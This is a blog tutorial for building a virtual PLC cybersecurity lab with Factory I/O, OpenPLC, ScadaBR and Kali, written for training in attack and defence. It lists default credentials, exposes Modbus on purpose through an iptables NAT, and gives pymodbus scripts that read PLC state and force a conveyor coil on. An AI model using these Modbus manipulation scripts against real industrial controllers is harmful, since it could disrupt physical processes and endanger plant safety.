<!doctype html><html lang=en><head><meta name=google-site-verification content="NTPifZ1gNpp6HSoC60ErvHiUUor86ZXg4yHtlpk9lwU"><title>Andrea Dainese > Virtual PLC lab for Cybersecurity scenarios</title><meta charset=utf-8><meta name=author content="Andrea Dainese"><meta name=description content="As you probably know, I&rsquo;m working on learning simulated lab for years. In the last couple of years, I moved to OT/ICS Cybersecurity, and sometimes I need a realistic lab to show the consequence of a Cyberattack targeting OT/ICS devices."><meta name=generator content="Hugo 0.115.3"><meta name=“robots” content="“noarchive”"><meta name=“robots” content="“notranslate”"><meta name=robots content="noimageindex"><meta property="og:title" content="Virtual PLC lab for Cybersecurity scenarios"><meta property="og:description" content="As you probably know, I&rsquo;m working on learning simulated lab for years. In the last couple of years, I moved to OT/ICS Cybersecurity, and sometimes I need a realistic lab to show the consequence of a Cyberattack targeting OT/ICS devices."><meta property="og:type" content="article"><meta property="og:url" content="https://www.adainese.it/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/"><meta property="og:image" content="https://www.adainese.it/factory-io-scene-1.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2022-04-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-04-03T00:00:00+00:00"><meta property="og:site_name" content="Andrea Dainese"><meta name=twitter:card content="summary"><meta name=twitter:site content="@adainese"><meta name=twitter:image content="https://www.adainese.itfactory-io-scene-1.png"><meta name=twitter:title content="Andrea Dainese > Virtual PLC lab for Cybersecurity scenarios"><meta name=twitter:description content="As you probably know, I&rsquo;m working on learning simulated lab for years. In the last couple of years, I moved to OT/ICS Cybersecurity, and sometimes I need a realistic lab to show the consequence of a Cyberattack targeting OT/ICS devices."><meta name=viewport content="width=device-width,initial-scale=1"><link rel=alternate type=application/rss+xml title="RSS Feed for blog" href=/blog/index.xml><link rel=dns-prefetch href=https://www.googletagmanager.com><link href=https://www.googletagmanager.com rel=preconnect crossorigin><link rel=apple-touch-icon sizes=57x57 href=/favicon/apple-icon-57x57.png><link rel=apple-touch-icon sizes=60x60 href=/favicon/apple-icon-60x60.png><link rel=apple-touch-icon sizes=72x72 href=/favicon/apple-icon-72x72.png><link rel=apple-touch-icon sizes=76x76 href=/favicon/apple-icon-76x76.png><link rel=apple-touch-icon sizes=114x114 href=/favicon/apple-icon-114x114.png><link rel=apple-touch-icon sizes=120x120 href=/favicon/apple-icon-120x120.png><link rel=apple-touch-icon sizes=144x144 href=/favicon/apple-icon-144x144.png><link rel=apple-touch-icon sizes=152x152 href=/favicon/apple-icon-152x152.png><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-icon-180x180.png><link rel=icon type=image/png sizes=192x192 href=/favicon/android-icon-192x192.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=96x96 href=/favicon/favicon-96x96.png><link rel=stylesheet type=text/css href=/plugins/fontawesome/css/all.min.css><link rel=stylesheet type=text/css href=/plugins/fancybox/jquery.fancybox.min.css><link rel=stylesheet type=text/css href=/fonts/opensans/opensans.css><link rel=stylesheet href=/css/style.min.db8a68dfac8ad6ed301e5f04872a83daee269833ef371fd9ec9475b745de14e5.css integrity="sha256-24po36yK1u0wHl8EhyqD2u4mmDPvNx/Z7JR1t0XeFOU="><link rel=stylesheet href=/css/print.min.a3802e6b39df8780c4980151b47550b34687a140e148c71342fb463b5322e6b1.css media=print integrity="sha256-o4Auaznfh4DEmAFRtHVQs0aHoUDhSMcTQvtGO1Mi5rE="></head><body><button type=button class="mobile-nav-toggle d-lg-none" aria-label="Toggle navigation"><i class="fas fa-bars"></i></button><header id=header class=fixed-top><div class="container d-flex"><div class="logo mr-auto"><h1><a href=/#><span>Andrea</span> Dainese</a></h1></div><nav class="nav-menu d-none d-lg-block"><ul><li><a href=/#>Home</a></li><li><a href=/#about>About</a></li><li class=active><a href=/blog>Blog</a></li><li><a href=/categories>Categories</a></li><li><a href=https://www.patreon.com/adainese target=_blank rel=noreferrer><i class="fa fa-heart"></i></a></li><li><a href=https://www.spreaker.com/podcast/info-sec-unplugged--6025156 target=_blank rel=noreferrer><i class="fa fa-podcast"></i></a></li><li><form class="form-inline ml-2" action=/search><div class="input-group mb-3"><input id=search-query type=text class=form-control placeholder=Search... name=s aria-label="Search within the website" aria-describedby=basic-addon2><div class=input-group-append><button class="btn btn-outline-primary" type=submit aria-label=Search>
<i class="fa fa-search"></i></button></div></div></form></li></ul></nav></div></header><div id=page-header><div class=home-overlay></div><div class=container><div class=row><div class=col-12><div class="page-header-size text-center"><h1>Virtual PLC lab for Cybersecurity scenarios</h1></div></div></div></div></div><main id=main><div class=blogpost-single><div class=container><div class=row><div class="col-xs-12 col-sm-12 col-md-4 d-print-none"><div class=blogpost-nav><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Table of contents</h4><div class=toce><nav id=TableOfContents><ul><li><a href=#requirements>Requirements</a></li><li><a href=#network-topology>Network topology</a></li><li><a href=#building-the-lab>Building the lab</a><ul><li><a href=#plc-and-plant>PLC and plant</a></li><li><a href=#automation>Automation</a></li></ul></li><li><a href=#hmi>HMI</a></li><li><a href=#preparing-the-scenario-for-a-realistic-attack>Preparing the scenario for a realistic attack</a></li><li><a href=#attacking-the-plc>Attacking the PLC</a></li><li><a href=#conclusions>Conclusions</a></li></ul></nav></div></div></div><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Latest posts</h4><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/12/frameworks-for-projects-with-cisco-aci-and-ndo/><img class="img-fluid rounded" src=/images/vendors/cisco.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/12/frameworks-for-projects-with-cisco-aci-and-ndo/>Frameworks for Projects with Cisco ACI and NDO</a><br><i class="fa fa-calendar"></i>
October 12, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/05/creating-an-interface-in-strata-cloud-manager/><img class="img-fluid rounded" src=/images/vendors/paloalto.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/05/creating-an-interface-in-strata-cloud-manager/>Creating an interface in Strata Cloud Manager</a><br><i class="fa fa-calendar"></i>
October 05, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/01/circular-dependencies-with-ndo/><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/01/circular-dependencies-with-ndo/>Circular Dependencies with NDO</a><br><i class="fa fa-calendar"></i>
October 01, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/09/28/modifying-an-object-in-strata-cloud-manager/><img class="img-fluid rounded" src=/images/vendors/paloalto.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/09/28/modifying-an-object-in-strata-cloud-manager/>Modifying an object in Strata Cloud Manager</a><br><i class="fa fa-calendar"></i>
September 28, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/09/24/from-single-site-to-multi-site-with-ndo/><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/09/24/from-single-site-to-multi-site-with-ndo/>From Single-Site to Multi-Site with NDO</a><br><i class="fa fa-calendar"></i>
September 24, 2025</p></div></div></div></div><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Categories</h4><div class=recent-post><div class=recent-post-img><a href=/categories/automation><img class="img-fluid rounded" src=/images/categories/automation.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/automation>Automation</a><br><i class="fa fa-blog"></i> 162 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/learning-paths><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/learning-paths>Learning paths</a><br><i class="fa fa-blog"></i> 126 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/ciso><img class="img-fluid rounded" src=/images/categories/ciso.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/ciso>CISO</a><br><i class="fa fa-blog"></i> 23 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/personal-security><img class="img-fluid rounded" src=/images/categories/personal-security.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/personal-security>Personal Security</a><br><i class="fa fa-blog"></i> 22 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/security><img class="img-fluid rounded" src=/images/categories/security.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/security>Security</a><br><i class="fa fa-blog"></i> 20 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/notes><img class="img-fluid rounded" src=/images/categories/notes.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/notes>Notes</a><br><i class="fa fa-blog"></i> 19 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/infrastructure><img class="img-fluid rounded" src=/images/categories/infrastructure.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/infrastructure>Infrastructure</a><br><i class="fa fa-blog"></i> 12 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/ot-ics><img class="img-fluid rounded" src=/images/categories/ot-ics.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/ot-ics>OT/ICS</a><br><i class="fa fa-blog"></i> 5 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/books><img class="img-fluid rounded" src=/images/categories/books.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/books>Books</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/unetlab><img class="img-fluid rounded" src=/images/categories/unetlab.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/unetlab>UNetLab</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/writeup><img class="img-fluid rounded" src=/images/categories/writeup.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/writeup>Write-up</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/osint><img class="img-fluid rounded" src=/images/categories/osint.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/osint>OSInt</a><br><i class="fa fa-blog"></i> 2 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/life><img class="img-fluid rounded" src=/images/categories/life.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/life>My life</a><br><i class="fa fa-blog"></i> 1 posts</p></div></div></div></div></div></div><div class="col-xs-12 col-sm-12 col-md-8 blogpost-container"><div class=row><div class="col-md-12 col-sm-12 col-xs-12"><article><div class=blogpost-single-content><h2>Virtual PLC lab for Cybersecurity scenarios</h2><div class=blogpost-single-meta><div><i class="fa fa-user"></i> Andrea Dainese</div><div><i class="fa fa-calendar"></i>
April 03, 2022</div><div class=tag-meta><i class="fa fa-folder"></i>
<a href=/categories/ot-ics/ title="All posts under OT/ICS">OT/ICS</a>,
<a href=/categories/security/ title="All posts under Security">Security</a></div></div><div class=entry-content><div><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp><img class="img-fluid w-25 rounded shadow float-right" src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp alt="Post cover"></a></div><p>As you probably know, I&rsquo;m working on learning simulated lab for years. In the last couple of years, I moved to OT/ICS Cybersecurity, and sometimes I need a realistic lab to show the consequence of a Cyberattack targeting OT/ICS devices. Sometimes I can use a physical lab, sometimes not.</p><p>After months, I think I found a good solution: it&rsquo;s not a real PLC, but I can use it for POC, training, attack & defense scenarios.</p><h2 id=requirements>Requirements</h2><p>This lab requires:</p><ul><li>1 Windows VM running the plant (trough
<a href=https://factoryio.com/ title="Factory I/O" target=_blank rel=noopener>Factory I/O</a>
)</li><li>1 Linux VM running the PLC (through
<a href=https://www.openplcproject.com/runtime/ title="OpenPLC Runtime" target=_blank rel=noopener>OpenPLC Runtime</a>
)</li><li>1 Windows engineering workstation (running
<a href=https://www.openplcproject.com/plcopen-editor/ title="OpenPLC Editor" target=_blank rel=noopener>OpenPLC Editor</a>
)</li><li>1 Linux VM running the HMI (through
<a href=https://www.openplcproject.com/reference/scadabr/ title=ScadaBR target=_blank rel=noopener>ScadaBR</a>
)</li><li>1 Linux attacker VM (running
<a href=https://www.kali.org/ title=Kali target=_blank rel=noopener>Kali</a>
)</li></ul><h2 id=network-topology>Network topology</h2><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/lab-topology.webp><img sizes="367 " srcset=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/lab-topology.webp src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/lab-topology.webp alt="Virtual PLC lab topology" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><p>We consider that the attacker owns a system placed in the same network where the PLC and HMI are.</p><h2 id=building-the-lab>Building the lab</h2><p>The lab is pretty complex and we are splitting it into four phases:</p><ol><li>PLC and plant</li><li>automation</li><li>HMI</li><li>attack</li></ol><h3 id=plc-and-plant>PLC and plant</h3><p>Prepare a Windows VM and install
<a href=https://factoryio.com/start-trial title="Try Factory I/O free for 30 days" target=_blank rel=noopener>Factory I/O</a>
. Place it into a dedicated (field) network.</p><p>Prepare also a Linux VM with
<a href=https://www.openplcproject.com/runtime/linux/ title="OpenPLC on Linux" target=_blank rel=noopener>OpenPLC Runtime</a>
. Configure it with two NICs; connect them to the field network and the public network.</p><p>In the Factory I/O VM, open Factory I/O, open the first scene (From A to B):</p><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp><img sizes="500 773 " srcset="/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1_hue9064972e425016d890896be5903467b_45044_500x0_resize_q75_h2_box_2.webp /blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp" src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp alt="Factory I/O scene #1" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><p>Go to <code>File -> Options -> Licensing</code> and activate the license (or the 30 days trial). Go to <code>File -> Drivers</code> and select <code>Modbus TCP/IP Server</code>. Attach sensors and actuators like the following:</p><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1-map.webp><img sizes="800 955 " srcset="/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1-map_huaa0f41041c4e1e3490c078be0329f65a_11926_800x0_resize_q75_h2_box_2.webp /blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1-map.webp" src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1-map.webp alt="Factory I/O scene #1 sensors and actuators map" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><p>Review also the configuration but it should be OK by default:</p><ul><li>Port: 502 (default)</li><li>Slave ID: 1 (default)</li><li>I/O Points (offset/count): 0/2, 0/1, 0/0, 0/0 (depends on the scene)</li></ul><p>Open the OpenPLC Runtime web interface using the port <code>8080</code>, username <code>openplc</code> and password <code>openplc</code>. Go to <code>Slave Devices -> Add new device</code> and configure it as follows:</p><ul><li>Device Name: Factory I/O</li><li>Device Type: Generic Modbus TCP Device</li><li>Slave ID: (see Factory I/O driver)</li><li>IP Address: (see Factory I/O driver)</li><li>IP Port: (see Factory I/O driver)</li><li>Start Addresses: (see Factory I/O driver)</li><li>End Addresses: (see Factory I/O driver)</li></ul><h3 id=automation>Automation</h3><p>Prepare a Windows VM and install
<a href=https://www.openplcproject.com/plcopen-editor/ title="OpenPLC Editor" target=_blank rel=noopener>OpenPLC Editor</a>
. This function can be embedded on the PLC VM, but in a real factory, the automation software is developed on a dedicated Windows engineering workstation.</p><p>Once OpenPLC Editor is installed, open it and create a new project. In this post, we are using Function Block Diagram (FBD) language. Configure the following variables:</p><table class="table table-dark table-striped table-bordered"><thead><tr><th style=text-align:center>Name</th><th style=text-align:center>Class</th><th style=text-align:center>Type</th><th style=text-align:center>Location</th><th style=text-align:center>Initial Value</th><th style=text-align:center>Options</th><th style=text-align:center>Documentation</th></tr></thead><tbody><tr><td style=text-align:center>Sensor</td><td style=text-align:center>Locale</td><td style=text-align:center>BOOL</td><td style=text-align:center>%IX100.0</td><td style=text-align:center></td><td style=text-align:center></td><td style=text-align:center>Detect the object</td></tr><tr><td style=text-align:center>Conveyor</td><td style=text-align:center>Locale</td><td style=text-align:center>BOOL</td><td style=text-align:center>%QX100.0</td><td style=text-align:center></td><td style=text-align:center>Start/stop the conveyor</td><td></td></tr></tbody></table><p>Drag and drop both variables and create the FBD:</p><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-program.webp><img sizes="311 " srcset=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-program.webp src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-program.webp alt="FBD PLC program" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><p>While the sensor is not detecting the object (closed circuit) the conveyor is running (closed-circuit too).</p><p>Finally, generate a program for OpenPLC Runtime, and upload it into the PLC controller using the OpenPLC Runtime web interface. Launch the program and when the compilation ends (<code>Compilation finished successfully!</code>), start the PLC. The output logs should be similar to the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>OpenPLC Runtime starting...
</span></span><span style=display:flex><span>Warning: Persistent Storage file not found
</span></span><span style=display:flex><span>Device Factory I/O is disconnected. Attempting to reconnect...
</span></span><span style=display:flex><span>Interactive Server: Listening on port 43628
</span></span><span style=display:flex><span>Connected to MB device Factory I/O
</span></span><span style=display:flex><span>Issued start_modbus() command to start on port: 502
</span></span><span style=display:flex><span>Server: Listening on port 502
</span></span><span style=display:flex><span>Server: waiting for new client...
</span></span></code></pre></div><p>Once the server is started, go back to the Factory I/O and start the simulation. The conveyor will move the object until the sensor detect it, then the conveyor will stop.</p><h2 id=hmi>HMI</h2><p>The final step requires implementing a Human Machine Interface (HMI). In the real world, engineers develop HMI using compiled code running on Windows. For our lab we are using web-based HMI SDK.</p><p>Connect to ScadaBR VM using a browser and pointing to the right URL: <code>http://SCADABR_IP:8080/ScadaBR/</code>. Login with username <code>admin</code> and password <code>admin</code> (if needed you can connect via SSH with username <code>scadabr</code> and password <code>scadabr</code>).</p><p>In <code>Data sources</code> create a <code>Modbus IP</code> source as follows:</p><ul><li>Name: OpenPLC</li><li>Update period: 100ms</li><li>Host: (see OpenPLC Runtime configuration)</li><li>Port: (see OpenPLC Runtime configuration)</li></ul><p>Then add three points:</p><ul><li>Plant: name=DP_Running, slave_id=1, register_range=input, offset=801, settable=False, red=0, green=1</li><li>Sensor: name=DP_Sensor, slave_id=1, register_range=input, offset=800, settable=False, red=1, green=1</li><li>Conveyor: name=DP_Conveyor, slave_id=1, register_range=coil, offset=800, settable=True, empty=1, detected=0</li></ul><p>Enable the above data sources and points by clicking on the <code>status</code> icon.</p><p>Move now to the graphical view and:</p><ul><li>add 3 binary graphics;</li><li>configure them using the above points and a proper image set;</li><li>save the view.</li></ul><p>The final output will be something like this:</p><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-hmi.webp><img sizes="243 " srcset=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-hmi.webp src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-hmi.webp alt="FBD PLC HMI" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><h2 id=preparing-the-scenario-for-a-realistic-attack>Preparing the scenario for a realistic attack</h2><p>OpenPLC is great software but it is pretty different from real ones: in practice, OpenPLC Runtime seems more robust than PLCs I find in real plants.</p><p>For the sake of this post, we want to make a vulnerable scenario so we can learn how to attack and defend plants. We are exposing the Factory I/O Modbus interface replacing OpenPLC Runtime. In the OpenPLC Runtime VM we need to make a destination NAT and enable routing:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get install iptables-persistent
</span></span><span style=display:flex><span>sudo iptables -t nat -A PREROUTING -i ens32 -p tcp --dport <span style=color:#ae81ff>502</span> -j DNAT --to-destination FACTORYIO_IP
</span></span><span style=display:flex><span>sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
</span></span><span style=display:flex><span>sudo iptables-save &gt; /etc/iptables/rules.v4
</span></span><span style=display:flex><span>sudo sysctl -w net.ipv4.ip_forward<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>sudo sed -i <span style=color:#e6db74>&#39;s/^#net\.ipv4\.ip_forward=.*/net\.ipv4\.ip_forward=1/&#39;</span> /etc/sysctl.conf
</span></span></code></pre></div><p>One more thing: the HMI points must be updated:</p><ul><li>Plant: name=DP_Running, slave_id=1, register_range=input, offset=801, settable=False, red=0, green=1</li><li>Sensor: name=DP_Sensor, slave_id=1, register_range=input, offset=800, settable=False, red=1, green=1</li><li>Conveyor: name=DP_Conveyor, slave_id=1, register_range=coil, offset=800, settable=True, empty=1, detected=0</li></ul><p>You may want to restart ScadaBR after the changes.</p><h2 id=attacking-the-plc>Attacking the PLC</h2><p>Let&rsquo;s move now to the attack machine. We are using Python with <code>pymodbus</code> module. Let&rsquo;s discover what is going on in the PLC (OpenPLC Runtime) while the simulation is running use the following script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pymodbus.client.sync <span style=color:#f92672>import</span> ModbusTcpClient <span style=color:#66d9ef>as</span> ModbusClient
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>client <span style=color:#f92672>=</span> ModbusClient(<span style=color:#e6db74>&#34;192.168.28.166&#34;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>502</span>)
</span></span><span style=display:flex><span>client<span style=color:#f92672>.</span>connect()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Coils:    &#34;</span>, client<span style=color:#f92672>.</span>read_coils(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span>, unit<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>bits)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Discrete: &#34;</span>, client<span style=color:#f92672>.</span>read_discrete_inputs(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span>, unit<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>bits)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Holding:  &#34;</span>, client<span style=color:#f92672>.</span>read_holding_registers(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>8</span>, unit<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>registers)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Input:    &#34;</span>, client<span style=color:#f92672>.</span>read_input_registers(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>8</span>, unit<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>registers)
</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
</span></span></code></pre></div><p>According to the output, captured while the plant is working, we can deduce that:</p><ul><li>Sensor 0x1 holds the state of the plant (True if running, False if stopped)</li><li>Sensor 0x0 holds the state of the Sensor (True if nothing is detected, False if the object is in place)</li><li>Coil 0x0 acts on the Conveyor (True to make it run, False to stop it)</li></ul><p>With this information we can, for example, maintain the conveyor running:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    client<span style=color:#f92672>.</span>write_coil(address<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, value<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, unit<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>)
</span></span></code></pre></div><p><a data-fancybox=gallery href=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-attack-1.webp><img sizes="800 960 " srcset="/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-attack-1_hu226b200aedd83d9e2b3cadbec63fbe0d_47544_800x0_resize_q75_h2_box_2.webp /blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-attack-1.webp" src=/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/fbd-plc-attack-1.webp alt="PLC Attack" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><h2 id=conclusions>Conclusions</h2><p>With this experiment, I&rsquo;m proposing you an easy method to get your hands in the OT world. It&rsquo;s complex, it&rsquo;s different, and sometimes you will feel 30 years behind (pro and cons), but it&rsquo;s something we have to deal with.</p></div></div></article><div class=clear></div></div></div></div></div></div></div></main><footer class=d-print-none><div class=footer-profile><div class=container id=contact><div class=row><div class="col-xs-12 col-sm-12 col-md-4"><div class=footer-head><h2><span>Andrea</span> Dainese</h2></div><p>For information, collaborations, proposals, requests for help, donations, use one of the following channels; email is preferred.</p><div class=footer-icons><ul><li><a href=https://www.patreon.com/adainese title="Support me" target=_blank rel=noreferrer><i class="fa fa-heart"></i></a></li><li><a href=https://www.linkedin.com/in/adainese/ title="LinkedIn profile" target=_blank rel=noreferrer><i class="fab fa-linkedin-in"></i></a></li><li><a href=https://twitter.com/adainese title="Twitter profile" target=_blank rel=noreferrer><i class="fab fa-twitter"></i></a></li><li><a href=mailto:andrea@adainese.it title="Secure email" target=_blank rel=noreferrer><i class="fa fa-envelope"></i></a></li><li><a href=https://www.spreaker.com/podcast/info-sec-unplugged--6025156 title=Podcast target=_blank rel=noreferrer><i class="fa fa-podcast"></i></a></li><li><a href=https://github.com/dainok/ title="GitHub repositories" target=_blank rel=noreferrer><i class="fab fa-github"></i></a></li><li><a href=/blog/index.xml title="RSS Feed" target=_blank><i class="fa fa-rss"></i></a></li></ul></div></div><div class="col-xs-12 col-sm-12 col-md-4"><div class=footer-head><h4>Past events</h4></div><div class=footer-content><ul><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20240305-cisco-aci-automation.pdf title="View slides" target=_blank rel=noreferrer>SDN: Software Defined Now</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20231122-cybercrime.pdf title="View slides" target=_blank rel=noreferrer>Cybercrime</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20220901-bgp-attack-scenarios.pdf title="View slides" target=_blank rel=noreferrer>BGP attack scenarios</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20220317-approaching-ot-ics-security.pdf title="View slides" target=_blank rel=noreferrer>Approaching OT/ICS Security</a> (with <a href=https://www.festocte.it/eventi/industry_4_0/17-03-2022/webinar_la_cybersecurity_nelle_reti_di_fabbrica_P/>Festo Academy</a>)</li><li><a href="https://www.youtube.com/watch?v=sjQZghTkHkA" title="View recording" target=_blank rel=noreferrer><i class="fa fa-video"></i></a>&nbsp;-&nbsp;<a href=/files/slides/20200922-cyberrange.pdf title="View slides" target=_blank rel=noreferrer>Cyber Range: Analyzing a Cyber Attack</a></li><li><a href="https://www.youtube.com/watch?v=-PWtGaS28dk" title="View recording" target=_blank rel=noreferrer><i class="fa fa-video"></i></a>&nbsp;-&nbsp;<a href=/files/slides/20200623-clubitfvg-securing-ot-ics-plants.pdf title="View slides" target=_blank rel=noreferrer>Securing OT/ICS plants</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20190226-automation-for-cisco-netops.pdf title="View slides" target=_blank rel=noreferrer>Automation for Cisco NetOps</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20181107-ciscon-sdn-complexity-and-tco-looking-for-an-easy-way.pdf title="View slides" target=_blank rel=noreferrer>SDN, Complexity and TCO</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20181003-nts-protection-and-visibility-for-enterprise-networks.pdf title="View slides" target=_blank rel=noreferrer>Protection and visibility for enterprise networks</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a href=/files/slides/20141106-festival-ict-why-wan-accelerators-still-matter.pdf title="View slides" target=_blank rel=noreferrer>Why WAN AccelerAtors (still) matter?</a></li><li><i class="fa fa-video-slash"></i>&nbsp;-&nbsp;<a 